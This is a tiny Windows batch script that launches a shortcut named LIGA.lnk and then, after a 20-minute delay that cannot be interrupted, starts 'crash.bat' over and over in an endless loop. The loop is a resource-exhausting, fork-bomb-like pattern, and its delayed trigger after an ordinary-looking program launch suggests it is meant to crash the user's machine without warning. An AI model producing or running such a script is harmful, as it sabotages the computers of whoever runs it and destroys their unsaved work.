@echo off
start LIGA.lnk
TIMEOUT /T 1200 /NOBREAK
:start
start crash.bat
goto :start
